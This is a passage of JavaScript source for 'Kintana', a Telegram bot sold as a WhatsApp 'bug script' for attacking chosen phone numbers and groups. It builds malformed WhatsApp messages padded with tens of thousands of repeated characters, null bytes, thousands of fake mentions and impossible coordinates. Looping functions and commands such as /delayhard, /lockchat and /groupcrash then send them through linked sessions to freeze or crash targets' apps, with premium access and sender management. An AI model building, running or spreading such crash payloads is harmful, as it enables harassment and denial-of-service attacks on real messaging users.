            { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000), url: "ꦾ".repeat(10000), merchant_url: "" }) },
            { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "screen_1_TextInput_0": "radio" + "\0".repeat(10000), "screen_0_Dropdown_1": "Null", "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." }), version: 3 }
          ]
        }
      }
    }), { quoted: null });

    msg.key.remoteJid = targetgroup;
    msg.key.fromMe = false;
    msg.key.id = generateMessageID();
    await sock.relayMessage(targetgroup, msg.message, { messageId: msg.key.id });
    console.log(`blank ${targetgroup}`);
  } catch (err) {
    console.error("error in BlankScreen:", err);
  }
}

function generateMessageID() {
  return Math.random().toString(36).slice(2) + Date.now();
}

async function GbCrash(sock, targetgroup) {
  try {
    const MgbMsg = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "Ӄ𝕀𝚴𝕋∆𝚴∆" + "ꦾ".repeat(50000),
            footerText: "Ӄ𝕀𝚴𝕋∆𝚴∆",
            headerType: 1,
            buttons: [{ buttonId: "Ӄ𝕀𝚴𝕋∆𝚴∆", buttonText: { displayText: "ꦽ".repeat(90000) }, type: 1 }],
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`),
              participant: targetgroup,
              remoteJid: targetgroup,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                locationMessage: {
                  degreesLatitude: 99999999999999999999,
                  degreesLongitude: 99999999999999999999,
                  name: "Ӄ𝕀𝚴𝕋∆𝚴∆",
                  address: "\u0000",
                  url: "\u0000",
                  jpegThumbnail: null
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(targetgroup, MgbMsg, { userJid: targetgroup });
    console.log("successfully sent group bug");
  } catch (err) {
    console.log(err);
  }
}

async function bug1(sock, target) {
  for (let i = 0; i < 10; i++) {
    try {
      await GatauTry(sock, target); 
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

async function bug2(sock, target) {
  for (let i = 0; i < 5; i++) {
    try {
      await lockchit(sock, target);     
      await halonyet(sock, target);
      await halonyet(sock, target);    
      await delaylohyah(sock, target);
      await sleep(500);               
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

async function bug3(sock, target) {
  for (let i = 0; i < 20; i++) {
    try {
      await blankclick(sock, target);
      await sleep(500);
      await delayhard(sock, target);
      await sleep(500);
      await halonyet(sock, target);
      await sleep(500);
      await delaylohyah(sock, target);
      await sleep(500);
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

async function bug4(sock, target) {
  for (let i = 0; i < 20; i++) {
    try {
      await delayhard(sock, target);
      await sleep(500);
      await halonyet(sock, target);
      await sleep(500);
      await delaylohyah(sock, target);
      await sleep(500);
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

async function bug5(sock, target) {
  for (let i = 0; i < 10; i++) {
    try {
      await GatauTry(sock, target);  
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString()) || userId.toString() === `${DEVELOPER}`;
}
function getPremiumStatus(userId) {
  const isPremium = premiumUsers.includes(userId);
  return isPremium ? "premium" : "no access";
}

let senderPublicEnabled = true;
let senderPrivateEnabled = true;

function getkintanaMenu() {
  let activePublic = 0;
  let activePrivate = 0;
  for (const [_, data] of sessions) {
    if (data.type === "public") activePublic++;
    else if (data.type === "private") activePrivate++;
  }

  let totalPublic = 0;
  let totalPrivate = 0;
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      for (const [_, data] of Object.entries(sessionsData)) {
        const type = typeof data === "string" ? data : data.type;
        if (type === "public") totalPublic++;
        else if (type === "private") totalPrivate++;
      }
    }
  } catch (e) {
    console.error("failed to read sessions.json:", e);
  }

  const publicDisplay = `${activePublic}/${totalPublic}`;
  const privateDisplay = `${activePrivate}/${totalPrivate}`;
  const publicStatus = activePublic > 0 ? "on" : "off";
  const privateStatus = activePrivate > 0 ? "on" : "off";

  const html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>
<p>this is where all whatsapp bug features are listed. please choose the feature you like.</p>

<h3>android bug (os)</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/delayhard</code></td><td>delayy hard crash</td></tr>
<tr><td><code>/lockchat</code></td><td>lock whatsapp chat</td></tr>
<tr><td><code>/forclosenew</code></td><td>forclose new whatsapp</td></tr>
<tr><td><code>/blankclick</code></td><td>crash click chat</td></tr>
<tr><td><code>/frezehard</code></td><td>freeze chat x delay</td></tr>
</table>

<h3>android bug group</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/groupcrash</code></td><td>blank click group x delay</td></tr>
<tr><td><code>/delaygroup</code></td><td>delay group x crash</td></tr>
</table>

<h3>sender status</h3>
<table border="2">
<tr><th>type</th><th>status</th></tr>
<tr><td>sender public</td><td>${publicDisplay} (${publicStatus})</td></tr>
<tr><td>sender private</td><td>${privateDisplay} (${privateStatus})</td></tr>
</table>

<p>all bugs carry the risk of being banned, okay?</p>

<tg-button-row>
  <tg-button type="callback_data" data="toggle_public" style="primary">sender public: ${publicDisplay}</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="toggle_private" style="primary">sender private: ${privateDisplay}</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="bug_info" style="danger">bug information</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
</tg-button-row>`;

  return { html };
}

bot.onText(/^\/start(?:\s|$)/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "no username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const greeting = getGreeting();

const html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>

<h3>${greeting}, ${username.toLowerCase()}</h3>

<p>i am a whatsapp bug script kintana version 10.1.0, created by heysaka.</p>

<tg-song>
  <audio controls preload="none" src="https://files.catbox.moe/8kf7bs.mp3"></audio>
  <footer style="font-size:12px; color:#888; margin-top:6px;">
    © 2026 - Kintana Bot Telegram
  </footer>
</tg-song>

<h3>information</h3>
<table border="2">
  <tr><th>info</th><th>detail</th></tr>
  <tr><td>creator</td><td>heysaka official id</td></tr>
  <tr><td>tiktok</td><td>https://www.tiktok.com/@h3ysaka</td></tr>
  <tr><td>version</td><td>10.1.0</td></tr>
  <tr><td>bot name</td><td>kintana</td></tr>
  <tr><td>runtime</td><td>${runtime.toLowerCase()}</td></tr>
  <tr><td>status</td><td>${premiumStatus.toLowerCase()}</td></tr>
</table>

<tg-button-row>
  <tg-button type="callback_data" data="owner_menu" style="primary">owner menu</tg-button>
  <tg-button type="callback_data" data="all_menu" style="primary">all menu</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="kintana-menu" style="primary">kintana menu</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="thanks_to" style="primary">thanks to</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">channel</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
</tg-button-row>`;

  await sendRichMenu(chatId, html);
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "no username";
    const senderId = query.from.id;
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const greeting = getGreeting();

    let html = "";

    if (query.data === "owner_menu") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>

<p>premium and admin access menu, please register to be able to use the bug.</p>

<h3>bot whatsapp</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/botwa</code></td><td>add bot whatsapp</td></tr>
<tr><td><code>/delbotwa</code></td><td>delete bot whatsapp</td></tr>
<tr><td><code>/listbotwa</code></td><td>list bot whatsapp</td></tr>
</table>

<h3>connect menu</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/addsenderpublic</code></td><td>add sender public</td></tr>
<tr><td><code>/addsenderprivat</code></td><td>add sender private</td></tr>
<tr><td><code>/delsenderpublic</code></td><td>delete sender public</td></tr>
<tr><td><code>/delsenderprivat</code></td><td>delete sender private</td></tr>
<tr><td><code>/listsenderpublic</code></td><td>list sender public</td></tr>
<tr><td><code>/listsenderprivat</code></td><td>list sender private</td></tr>
<tr><td><code>/listsender</code></td><td>list all senders</td></tr>
</table>

<h3>group murbug add</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/modemurbuggb</code></td><td>on / off (admin only)</td></tr>
</table>

<h3>security</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/blockcmd</code></td><td>on / off (owner only)</td></tr>
<tr><td><code>/block /command</code></td><td>block a specific command</td></tr>
<tr><td><code>/unblock /command</code></td><td>unblock a command</td></tr>
<tr><td><code>/listblock</code></td><td>list blocked commands</td></tr>
</table>

<h3>access menu</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/addowner</code></td><td>user id</td></tr>
<tr><td><code>/delowner</code></td><td>user id</td></tr>
<tr><td><code>/addprem</code></td><td>user id</td></tr>
<tr><td><code>/delprem</code></td><td>user id</td></tr>
<tr><td><code>/listprem</code></td><td>list premium</td></tr>
<tr><td><code>/listowner</code></td><td>list owner</td></tr>
<tr><td><code>/setjeda</code></td><td>set delay on bug features</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
</tg-button-row>`;
    }

    else if (query.data === "bug_info") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>

<p>before using the bug feature, you must read this first so you don't make a mistake using it.</p>

<h3>rules</h3>
<table border="2">
<tr><th>#</th><th>rule</th></tr>
<tr><td>1</td><td>don't bug random numbers, especially if the target did nothing wrong</td></tr>
<tr><td>2</td><td>avoid new sender / nokos (free), because it's prone to limits / blocks</td></tr>
<tr><td>3</td><td>don't spam bugs excessively</td></tr>
<tr><td>4</td><td>use <code>/setjeda</code> so the process is smoother</td></tr>
<tr><td>5</td><td>prioritize old / stable numbers. the stronger your number, the more optimal</td></tr>
</table>

<h3>if error</h3>
<table border="2">
<tr><th>problem</th><th>solution</th></tr>
<tr><td>can't pair / connect number</td><td>try another number that's still stable</td></tr>
<tr><td>bug doesn't work</td><td>check the target condition first. maybe the target is strong or your sender is being limited</td></tr>
<tr><td>your number is safe but still having problems</td><td>contact @heysaka to check your script</td></tr>
</table>

<p>don't minus the literacy okay</p>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="callback_data" data="kintana-menu" style="primary">back to menu</tg-button>
</tg-button-row>`;
    }

    else if (query.data === "all_menu") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>
<p>all menu contains all the features available in this bot.</p>

<h3>tools menu</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/info</code></td><td>check telegram id</td></tr>
<tr><td><code>/tourl</code></td><td>convert media to url</td></tr>
<tr><td><code>/cekfunc</code></td><td>check bug function</td></tr>
<tr><td><code>/tiktok</code></td><td>tiktok downloader</td></tr>
<tr><td><code>/pinterest</code></td><td>search pinterest</td></tr>
</table>

<h3>fun menu</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/brat</code></td><td>make brat sticker</td></tr>
<tr><td><code>/play</code></td><td>search youtube music</td></tr>
<tr><td><code>/jadihitam</code></td><td>change skin to black</td></tr>
<tr><td><code>/jadianime</code></td><td>change photo to anime</td></tr>
<tr><td><code>/iqc</code></td><td>iphone quotes whatsapp</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
</tg-button-row>`;
    }

    else if (query.data === "kintana-menu") {
      const { html: kHtml } = getkintanaMenu();
      html = kHtml;
    }

    else if (query.data === "toggle_public") {
      senderPublicEnabled = !senderPublicEnabled;
      await bot.answerCallbackQuery(query.id, { text: `sender public ${senderPublicEnabled ? "on" : "off"}`, show_alert: false });
      const { html: kHtml } = getkintanaMenu();
      html = kHtml;
    }

    else if (query.data === "toggle_private") {
      senderPrivateEnabled = !senderPrivateEnabled;
      await bot.answerCallbackQuery(query.id, { text: `sender private ${senderPrivateEnabled ? "on" : "off"}`, show_alert: false });
      const { html: kHtml } = getkintanaMenu();
      html = kHtml;
    }

    else if (query.data === "thanks_to") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>
<table border="2">
<tr><th>role</th><th>name</th></tr>
<tr><td>creator</td><td>heysaka official id</td></tr>
<tr><td>friend</td><td>niel</td></tr>
<tr><td>friend</td><td>kintana buyer</td></tr>
</table>

<p>and to all kintana script users, thank you for your support.</p>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://instagram.com/@sakaurbans" style="primary">instagram</tg-button>
  <tg-button type="url" url="https://youtube.com/@sakaurbansoffc" style="primary">youtube</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">telegram</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
</tg-button-row>`;
    }

    else if (query.data === "back_to_main") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>

<h3>${greeting}, ${username.toLowerCase()}</h3>

<p>i am a whatsapp bug script kintana version 10.1.0, created by heysaka.</p>

<tg-song>
  <audio controls preload="none" src="https://files.catbox.moe/8kf7bs.mp3"></audio>
  <footer style="font-size:12px; color:#888; margin-top:6px;">
    © 2026 - Kintana Bot Telegram 
  </footer>
</tg-song>

<h3>information</h3>
<table border="2">
  <tr><th>info</th><th>detail</th></tr>
  <tr><td>creator</td><td>heysaka official id</td></tr>
  <tr><td>tiktok</td><td>https://www.tiktok.com/@h3ysaka</td></tr>
  <tr><td>version</td><td>10.1.0</td></tr>
  <tr><td>bot name</td><td>kintana</td></tr>
  <tr><td>runtime</td><td>${runtime.toLowerCase()}</td></tr>
  <tr><td>status</td><td>${premiumStatus.toLowerCase()}</td></tr>
</table>

<tg-button-row>
  <tg-button type="callback_data" data="owner_menu" style="primary">owner menu</tg-button>
  <tg-button type="callback_data" data="all_menu" style="primary">all menu</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="kintana-menu" style="primary">kintana menu</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="thanks_to" style="primary">thanks to</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">channel</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
</tg-button-row>`;
    }

    if (html) {
      await editRichMenu(chatId, messageId, html);
      await bot.answerCallbackQuery(query.id);
    }

  } catch (error) {
    console.error("error handling callback query:", error);
    try {
      await bot.answerCallbackQuery(query.id, { text: "an error occurred: " + error.message, show_alert: true });
    } catch (e) {}
  }
});

bot.onText(/^\/(addsenderpublic|addsenderprivat)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];
  const type = command === "addsenderpublic" ? "public" : "private";
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  const input = match[2];
  if (!input) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${command}</td></tr>
<tr><td>example</td><td>/${command} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const botNumber = input.replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId, type, userId);
  } catch (error) {
    console.error(`error in ${command}:`, error);
    sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>failed to connect</td></tr>
<tr><td>message</td><td>${error.message}</td></tr>
</table>`
    );
  }
});

bot.onText(/^\/(delsenderpublic|delsenderprivat)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];
  const targetType = command === "delsenderpublic" ? "public" : "private";
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  const input = match[2];
  if (!input) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${command}</td></tr>
<tr><td>example</td><td>/${command} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const botNumber = input.replace(/[^0-9]/g, "");

  const token = bot.token;
  let statusMessageId = null;
  try {
    const html = `<h3>deleting bot</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>bot</td><td>${botNumber}</td></tr>
<tr><td>type</td><td>${targetType}</td></tr>
<tr><td>status</td><td>processing...</td></tr>
</table>`;
    const res = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
      chat_id: chatId,
      rich_message: { html: RICH_CSS + html }
    });
    statusMessageId = res?.data?.result?.message_id;
  } catch (e) {
    console.error("failed to send status:", e?.message);
  }

  const editStatus = async (title, rows) => {
    if (!statusMessageId) return;
    let rowsHtml = "";
    for (const [k, v] of rows) rowsHtml += `<tr><td>${k}</td><td>${v}</td></tr>\n`;
    const html = `<h3>${title}</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
${rowsHtml}
</table>`;
    try {
      await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
        chat_id: chatId,
        message_id: statusMessageId,
        rich_message: { html: RICH_CSS + html }
      });
    } catch (e) {
      console.error("failed to edit status:", e?.message);
    }
  };

  try {
    const sessionData = sessions.get(botNumber);

    if (sessionData) {
      if (sessionData.type !== targetType) {
        return await editStatus("error", [
          ["bot", botNumber],
          ["status", `this bot is a ${sessionData.type} sender`],
          ["note", `use /delsender${sessionData.type}`]
        ]);
      }

      const sock = sessionData.sock;
      try {
        await sock?.logout();
      } catch (err) {
        console.error("error logging out socket:", err);
      }

      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      removeActiveSession(botNumber);

      await editStatus("bot deleted", [
        ["bot", botNumber],
        ["type", targetType],
        ["status", "successfully deleted"]
      ]);
    } else {
      await editStatus("error", [
        ["bot", botNumber],
        ["status", "bot not found"]
      ]);
    }
  } catch (error) {
    console.error("error deleting bot:", error);
    await editStatus("error", [
      ["bot", botNumber],
      ["status", error.message]
    ]);
  }
});

const JEDA_PATH = path.join(__dirname, 'pause.json');

function loadConfig() {
    try {
        if (fs.existsSync(JEDA_PATH)) {
            const data = fs.readFileSync(JEDA_PATH, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.log('error loading config:', error);
    }
    return { delayMs: 0, lastBugTime: 0 };
}

function saveConfig(config) {
    try {
        fs.writeFileSync(JEDA_PATH, JSON.stringify(config, null, 2));
        console.log('config saved to pause.json');
    } catch (error) {
        console.log('error saving config:', error);
    }
}

let jedalohyah = loadConfig();
let delayMs = jedalohyah.delayMs || 0;
let lastBugTime = jedalohyah.lastBugTime || 0;

console.log(`loaded delay: ${delayMs}ms`);

function getCurrentDelay() {
    return delayMs;
}

function updateDelay(newDelay) {
    delayMs = newDelay;
    jedalohyah.delayMs = newDelay;
    saveConfig(jedalohyah);
}

function updateLastBugTime() {
    lastBugTime = Date.now();
    jedalohyah.lastBugTime = lastBugTime;
    saveConfig(jedalohyah);
}

function getRemainingTime() {
    const elapsed = Date.now() - lastBugTime;
    const remaining = delayMs - elapsed;
    return remaining > 0 ? remaining : 0;
}

function formatDelay(ms) {
    if (ms === 0) return 'no delay';
    const seconds = ms / 1000;
    if (seconds < 60) return `${seconds}s`;
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = Math.round(seconds % 60);
    if (remainingSeconds === 0) return `${minutes}m`;
    return `${minutes}m ${remainingSeconds}s`;
}

bot.onText(/^\/setjeda(?:\s(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return restricted(chatId);
  }

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/setjeda</td></tr>
<tr><td>example</td><td>/setjeda 5s / 2m / 1h</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const input = match[1].toLowerCase().trim();
  const timeUnit = input.slice(-1);
  const timeValue = parseInt(input.slice(0, -1));

  if (isNaN(timeValue) || !['s', 'm', 'h'].includes(timeUnit)) {
    return sendRichMenu(chatId,
      `<h3>invalid format</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/setjeda 5s / 2m / 1h</td></tr>
</table>`,
      msg.message_id
    );
  }

  let newDelay = 0;
  if (timeUnit === 's') newDelay = timeValue * 1000;
  if (timeUnit === 'm') newDelay = timeValue * 60 * 1000;
  if (timeUnit === 'h') newDelay = timeValue * 60 * 60 * 1000;

  updateDelay(newDelay);
  updateLastBugTime();

  await sendRichMenu(chatId,
    `<h3>delay set</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>delay</td><td>${input}</td></tr>
<tr><td>duration</td><td>${formatDelay(delayMs)}</td></tr>
<tr><td>saved in</td><td>pause.json</td></tr>
</table>`,
    msg.message_id
  );
});

bot.onText(/^\/cekjeda$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return restricted(chatId);
  }

  const remaining = getRemainingTime();
  let status = 'ready to use';
  if (remaining > 0) status = `wait ${formatDelay(remaining)} more`;

  await sendRichMenu(chatId,
    `<h3>delay info</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>delay</td><td>${formatDelay(delayMs)}</td></tr>
<tr><td>in ms</td><td>${delayMs}ms</td></tr>
<tr><td>saved in</td><td>pause.json</td></tr>
<tr><td>status</td><td>${status}</td></tr>
</table>`
  );
});

bot.onText(/^\/resetjeda$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return restricted(chatId);
  }

  updateDelay(0);
  updateLastBugTime();
  await sendRichMenu(chatId,
    `<h3>delay reset</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>successfully reset to 0</td></tr>
<tr><td>note</td><td>no delay mode</td></tr>
</table>`
  );
});

async function sendBugSuccess(chatId, formattedNumber, commandName, replyToMsgId = null) {
  const html = `<h3>bug has been sent</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>target</td><td>${formattedNumber}</td></tr>
<tr><td>type</td><td>/${commandName}</td></tr>
<tr><td>script version</td><td>10.1.0</td></tr>
<tr><td>status</td><td>done</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="https://wa.me/${formattedNumber}" style="primary">check target</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaOfficial/41" style="primary">rating script</tg-button>
</tg-button-row>`;
  await sendRichMenu(chatId, html, replyToMsgId);
}

bot.onText(/^\/(delayhard)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug1(sock, target);
        bug1(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(lockchat)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug2(sock, target);
        bug2(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

